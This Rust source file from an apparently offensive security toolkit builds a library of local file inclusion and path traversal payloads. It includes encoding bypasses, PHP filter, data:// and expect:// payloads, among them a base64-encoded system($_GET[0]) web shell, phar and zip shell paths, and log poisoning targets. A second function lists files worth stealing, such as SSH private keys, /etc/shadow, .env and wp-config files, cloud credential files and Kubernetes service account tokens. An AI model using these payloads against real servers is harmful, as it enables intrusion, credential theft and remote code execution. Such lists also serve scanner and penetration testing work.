// ----------------------------------------------------------------------------
//  lfi.rs — LFI/path traversal payloads
// ----------------------------------------------------------------------------
//  LFI/path traversal payloads — directory traversal sequences for file inclusion testing.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//  ⚠ WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です。
//  教育目的および参照目的での閲覧のみ許可されています。
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく、修正、配布、サブライセンス、
//  または二次的著作物の作成を禁止します。
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产。
//  仅允许出于教育和参考目的查看。未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改、分发、再许可或创建衍生作品。
// ---------------------------------------------------------------------------
//
//

// ◆ Lfi: LFI/パストラバーサルペイロード
// ◆ Local File Inclusion payloads covering multiple techniques.
// ■ ペイロードタイプ:
//   ➊ Unix相対トラバーサル — ../etc/passwd（階層2〜12）
//   ➋ URLエンコードバリアント — %2f, %252f, %c0%af（IIS/Apache）
//   ➌ PHPラッパー — php://filter base64-encode, rot13, iconv
//   ➍ Nullバイト — %00トランケーション（PHP < 5.3.4）
//   ➎ Windows — ..\..\win.ini, %5cエンコード
//   ➏ その他スキーム — file://, expect://, data://, phar://, zip://
//   ➐ ログポイズニング — access.log, error.log
//   ➑ /procファイルシステム — environ, cmdline, fd/*
// ♢ get_linux_files: 高価値Linuxファイル一覧（SSH鍵・DB電脳設定・クラウド認証情報）
/// LFI/path traversal payload library.
pub struct Lfi;

impl Lfi {
    // ◆ get_payloads: 全LFIペイロード生成
    // ◆ Generates complete LFI payload set — traversal, wrappers, schemes, log files.
    // ■ カテゴリ:
    //   ../etc/passwd (depth 2-12), URLエンコード (%2f, %252f, %c0%af)
    //   ドット拡張 (....//), Nullバイト (%00), Windows (..\\win.ini)
    //   PHP wrappers (php://filter), file://, expect://, data://
    //   phar://, zip://, ログファイル (/var/log/apache2/*), /proc/*
    /// Core traversal payloads covering Unix, Windows, encoding variants.
    pub fn get_payloads() -> Vec<String> {
        let mut p = Vec::new();

        // ── Unix relative traversal ──────────────────────────────────────────
        for depth in 2..=12 {
            p.push(format!("{}etc/passwd", "../".repeat(depth)));
        }

        // ── URL-encoded variants ─────────────────────────────────────────────
        p.push("..%2f..%2f..%2fetc%2fpasswd".to_string());
        p.push("..%252f..%252f..%252fetc%252fpasswd".to_string());
        p.push("%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string());
        p.push("%252e%252e/%252e%252e/%252e%252e/etc/passwd".to_string());
        p.push("..%c0%af..%c0%af..%c0%afetc/passwd".to_string());
        p.push("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd".to_string());

        // ── Dot-dot with extra dots ──────────────────────────────────────────
        p.push("....//....//....//etc/passwd".to_string());
        p.push("..../....//..../etc/passwd".to_string());
        p.push("..\\;./..\\;./..\\;./etc/passwd".to_string());

        // ── Null byte (PHP < 5.3.4) ──────────────────────────────────────────
        p.push("../../../etc/passwd%00".to_string());
        p.push("../../../etc/passwd%00.jpg".to_string());
        p.push("../../../etc/passwd%00.php".to_string());
        p.push("../../../etc/passwd%00.html".to_string());
        p.push("../../../../etc/passwd%00.png".to_string());

        // ── Windows ──────────────────────────────────────────────────────────
        p.push("..\\..\\..\\windows\\win.ini".to_string());
        p.push("..%5c..%5c..%5cwindows%5cwin.ini".to_string());
        p.push("../../../windows/win.ini".to_string());
        p.push("../../../windows/system32/config/sam".to_string());
        p.push("../../../windows/system32/config/system".to_string());
        p.push("../../../windows/system32/drivers/etc/hosts".to_string());
        p.push("../../../windows/repair/sam".to_string());
        p.push("../../../windows/repair/system".to_string());
        p.push("..\\..\\..\\boot.ini".to_string());
        p.push("..\\..\\..\\autoexec.bat".to_string());

        // ── PHP wrappers ─────────────────────────────────────────────────────
        p.push("php://filter/convert.base64-encode/resource=/etc/passwd".to_string());
        p.push("php://filter/read=convert.base64-encode/resource=/etc/passwd".to_string());
        p.push("php://filter/read=string.rot13/resource=/etc/passwd".to_string());
        p.push("php://filter/read=convert.iconv.utf-8.utf-7/resource=/etc/passwd".to_string());
        p.push("php://filter/convert.base64-encode/resource=/etc/shadow".to_string());
        p.push("php://filter/convert.base64-encode/resource=index.php".to_string());
        p.push("php://filter/read=convert.base64-encode/resource=/var/www/html/config.php".to_string());
        p.push("php://filter/read=convert.base64-encode/resource=/var/www/html/.env".to_string());
        p.push("php://input".to_string());

        // ── PHP filter chain (RCE via iconv) — requires POST body ────────────
        // The actual chain is generated by get_filter_chain_rce()

        // ── Other URI schemes ────────────────────────────────────────────────
        p.push("file:///etc/passwd".to_string());
        p.push("file:///etc/shadow".to_string());
        p.push("file://localhost/etc/passwd".to_string());
        p.push("file:///proc/self/environ".to_string());
        p.push("file:///var/www/html/index.php".to_string());
        p.push("expect://id".to_string());
        p.push("expect://whoami".to_string());
        p.push("expect://ls -la".to_string());
        p.push("expect://cat /etc/passwd".to_string());
        p.push("data://text/plain,<?php phpinfo(); ?>".to_string());
        p.push("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==".to_string());
        p.push("data://text/plain,<?php system('id'); ?>".to_string());
        p.push("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==".to_string());

        // ── Phar deserialization ─────────────────────────────────────────────
        p.push("phar:///var/www/html/upload/shell.jpg/shell.php".to_string());
        p.push("phar:///var/www/html/upload/logo.png/test.php".to_string());
        p.push("phar:///tmp/uploads/avatar.jpg/evil.php".to_string());

        // ── Zip wrapper ──────────────────────────────────────────────────────
        p.push("zip:///var/www/html/upload/shell.zip#shell.php".to_string());
        p.push("zip:///tmp/archive.zip#index.php".to_string());

        // ── Log file paths (for log poisoning) ───────────────────────────────
        p.push("../../../../var/log/apache2/access.log".to_string());
        p.push("../../../../var/log/apache2/error.log".to_string());
        p.push("../../../../var/log/nginx/access.log".to_string());
        p.push("../../../../var/log/nginx/error.log".to_string());
        p.push("../../../../var/log/httpd/access_log".to_string());
        p.push("../../../../var/log/auth.log".to_string());
        p.push("../../../../var/log/messages".to_string());
        p.push("../../../../var/log/syslog".to_string());

        // ── Proc filesystem ──────────────────────────────────────────────────
        p.push("/proc/self/environ".to_string());
        p.push("/proc/self/cmdline".to_string());
        p.push("/proc/self/fd/0".to_string());
        p.push("/proc/self/fd/1".to_string());
        p.push("/proc/self/fd/2".to_string());
        p.push("/proc/self/fd/3".to_string());
        p.push("/proc/self/status".to_string());
        p.push("/proc/self/maps".to_string());
        p.push("/proc/self/cwd/index.php".to_string());

        p
    }

    // ◆ get_linux_files: Linux高価値ファイル一覧
    // ◆ High-value target files for sensitive data exfiltration via LFI.
    // ■ カテゴリ:
    //   システム (/etc/passwd, /etc/shadow, /etc/crontab, /etc/sudoers)
    //   SSH鍵 (/root/.ssh/id_rsa, authorized_keys)
    //   シェル履歴 (.bash_history, .zsh_history)
    //   Web電脳設定 (apache2.conf, nginx.conf, php.ini)
    //   データベース電脳設定 (my.cnf, postgresql.conf, mongodb.conf)
    //   クラウド認証情報 (.aws/credentials, .gcp/, .azure/)
    //   Docker/K8s (.dockerenv, k8s serviceaccount token)
    /// High-value Linux files for LFI exploitation.
    pub fn get_linux_files() -> Vec<String> {
        vec![
            // System
            "/etc/passwd".to_string(),
            "/etc/shadow".to_string(),
            "/etc/group".to_string(),
            "/etc/hosts".to_string(),
            "/etc/hostname".to_string(),
            "/etc/issue".to_string(),
            "/etc/motd".to_string(),
            "/etc/resolv.conf".to_string(),
            "/etc/crontab".to_string(),
            "/etc/sudoers".to_string(),
            "/etc/sudoers.d/".to_string(),
            "/etc/fstab".to_string(),
            "/etc/mtab".to_string(),
            "/etc/os-release".to_string(),
            "/etc/lsb-release".to_string(),
            "/etc/redhat-release".to_string(),
            "/etc/debian_version".to_string(),
            "/etc/aliases".to_string(),
            "/etc/security/limits.conf".to_string(),
            "/etc/selinux/config".to_string(),
            // SSH
            "/etc/ssh/sshd_config".to_string(),
            "/etc/ssh/ssh_host_rsa_key".to_string(),
            "/etc/ssh/ssh_host_ecdsa_key".to_string(),
            "/root/.ssh/id_rsa".to_string(),
            "/root/.ssh/id_ecdsa".to_string(),
            "/root/.ssh/id_ed25519".to_string(),
            "/root/.ssh/authorized_keys".to_string(),
            "/root/.ssh/config".to_string(),
            "/home/ubuntu/.ssh/id_rsa".to_string(),
            "/home/user/.ssh/id_rsa".to_string(),
            "/home/deploy/.ssh/id_rsa".to_string(),
            "/home/www-data/.ssh/id_rsa".to_string(),
            "/home/vagrant/.ssh/id_rsa".to_string(),
            // Shell history
            "/root/.bash_history".to_string(),
            "/root/.zsh_history".to_string(),
            "/root/.bashrc".to_string(),
            "/root/.profile".to_string(),
            "/home/ubuntu/.bash_history".to_string(),
            "/home/user/.bash_history".to_string(),
            "/home/deploy/.bash_history".to_string(),
            // Web server configs
            "/etc/apache2/apache2.conf".to_string(),
            "/etc/apache2/ports.conf".to_string(),
            "/etc/apache2/sites-enabled/000-default.conf".to_string(),
            "/etc/apache2/sites-available/default-ssl.conf".to_string(),
            "/etc/httpd/conf/httpd.conf".to_string(),
            "/etc/httpd/conf.d/".to_string(),
            "/etc/nginx/nginx.conf".to_string(),
            "/etc/nginx/sites-enabled/default".to_string(),
            "/etc/nginx/conf.d/default.conf".to_string(),
            "/etc/nginx/conf.d/ssl.conf".to_string(),
            "/etc/php/8.1/apache2/php.ini".to_string(),
            "/etc/php/7.4/apache2/php.ini".to_string(),
            "/etc/php/5.6/apache2/php.ini".to_string(),
            "/etc/php/8.1/cli/php.ini".to_string(),
            "/usr/local/etc/php/php.ini".to_string(),
            "/usr/local/php/etc/php.ini".to_string(),
            // Database
            "/etc/mysql/my.cnf".to_string(),
            "/etc/mysql/mysql.conf.d/mysqld.cnf".to_string(),
            "/etc/mysql/debian.cnf".to_string(),
            "/etc/postgresql/13/main/postgresql.conf".to_string(),
            "/etc/postgresql/13/main/pg_hba.conf".to_string(),
            "/etc/mongodb.conf".to_string(),
            "/etc/redis/redis.conf".to_string(),
            // Proc
            "/proc/version".to_string(),
            "/proc/self/environ".to_string(),
            "/proc/self/cmdline".to_string(),
            "/proc/self/status".to_string(),
            "/proc/self/maps".to_string(),
            "/proc/mounts".to_string(),
            "/proc/net/tcp".to_string(),
            "/proc/net/udp".to_string(),
            "/proc/net/arp".to_string(),
            "/proc/net/route".to_string(),
            "/proc/net/fib_trie".to_string(),
            "/proc/net/dev".to_string(),
            "/proc/1/cmdline".to_string(),
            "/proc/1/environ".to_string(),
            "/proc/1/cwd".to_string(),
            "/proc/1/root".to_string(),
            // Logs (useful for log poisoning)
            "/var/log/apache2/access.log".to_string(),
            "/var/log/apache2/error.log".to_string(),
            "/var/log/apache2/access_log".to_string(),
            "/var/log/apache2/error_log".to_string(),
            "/var/log/nginx/access.log".to_string(),
            "/var/log/nginx/error.log".to_string(),
            "/var/log/httpd/access_log".to_string(),
            "/var/log/httpd/error_log".to_string(),
            "/var/log/auth.log".to_string(),
            "/var/log/secure".to_string(),
            "/var/log/syslog".to_string(),
            "/var/log/messages".to_string(),
            "/var/log/mail.log".to_string(),
            "/var/log/mail.err".to_string(),
            "/var/log/vsftpd.log".to_string(),
            "/var/log/proftpd/proftpd.log".to_string(),
            "/var/log/mysql/error.log".to_string(),
            "/var/log/mysql/mysql-slow.log".to_string(),
            "/var/log/postgresql/postgresql-13-main.log".to_string(),
            "/var/log/redis/redis-server.log".to_string(),
            "/var/log/dpkg.log".to_string(),
            "/var/log/apt/term.log".to_string(),
            "/var/log/installer/syslog".to_string(),
            "/var/log/ufw.log".to_string(),
            "/var/log/boot.log".to_string(),
            "/var/log/cloud-init.log".to_string(),
            "/var/log/cloud-init-output.log".to_string(),
            // App configs — general
            "/var/www/html/.env".to_string(),
            "/var/www/html/.env.local".to_string(),
            "/var/www/html/.env.production".to_string(),
            "/var/www/html/config.php".to_string(),
            "/var/www/html/config/database.php".to_string(),
            "/var/www/html/config/db.php".to_string(),
            "/var/www/html/config/app.php".to_string(),
            "/var/www/html/configuration.php".to_string(),
            "/var/www/html/settings.php".to_string(),
            "/var/www/html/db.php".to_string(),
            "/var/www/html/database.php".to_string(),
            "/var/www/html/includes/config.php".to_string(),
            "/var/www/html/inc/config.php".to_string(),
            "/var/www/html/private/config.php".to_string(),
            "/var/www/html/app/config/config.php".to_string(),
            "/var/www/html/application/config/database.php".to_string(),
            // App configs — CMS
            "/var/www/html/wp-config.php".to_string(),
            "/var/www/html/wp-config-sample.php".to_string(),
            "/var/www/html/wp-content/debug.log".to_string(),
            "/var/www/html/sites/default/settings.php".to_string(),
            "/var/www/html/sites/default/default.settings.php".to_string(),
            "/var/www/html/sites/default/settings.local.php".to_string(),
            "/var/www/html/administrator/logs/error.log".to_string(),
            "/var/www/html/configuration.php.bak".to_string(),
            "/var/www/html/.htaccess".to_string(),
            "/var/www/html/.git/config".to_string(),
            "/var/www/html/composer.json".to_string(),
            "/var/www/html/package.json".to_string(),
            // AWS / cloud credentials
            "/home/ubuntu/.aws/credentials".to_string(),
            "/home/ubuntu/.aws/config".to_string(),
            "/root/.aws/credentials".to_string(),
            "/home/ubuntu/.gcp/credentials.json".to_string(),
            "/root/.azure/azureProfile.json".to_string(),
            // Docker / Kubernetes
            "/.dockerenv".to_string(),
            "/run/secrets/kubernetes.io/serviceaccount/token".to_string(),
            "/run/secrets/kubernetes.io/serviceaccount/namespace".to_string(),
            "/var/run/secrets/kubernetes.io/serviceaccount/token".to_string(),
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt".to_string(),
            "/etc/kubernetes/admin.conf".to_string(),
            "/etc/kubernetes/kubelet.conf".to_string(),
            "/etc/docker/daemon.json".to_string(),
            "/etc/docker/key.json".to_string(),
        ]
    }

}
